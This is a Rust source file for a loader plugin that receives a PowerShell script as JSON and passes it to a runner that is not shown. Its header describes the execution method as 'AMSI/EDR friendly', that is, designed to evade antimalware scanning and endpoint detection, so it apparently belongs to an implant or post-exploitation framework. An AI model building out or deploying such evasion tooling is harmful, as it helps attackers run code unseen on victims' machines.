//! PowerShell cloud module 鈥?script execution via stdin pipe (AMSI/EDR friendly).
#![allow(non_snake_case)]
#![allow(clippy::upper_case_acronyms)]

mod power_shell;

use serde_json::Value;

/// libra-load ABI entry point.
#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("powershell", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };
    let result = dispatch(&input_json);
    write_output(&result, output, output_cap)
}

fn dispatch(input: &str) -> String {
    let v: Value = serde_json::from_str(input).unwrap_or(Value::Object(Default::default()));
    let script = v.get("script").and_then(|s| s.as_str()).unwrap_or("");

    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map(|rt| rt.block_on(power_shell::PowerShellRunner::execute(script)))
        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe { std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n); }
    }
    n
}
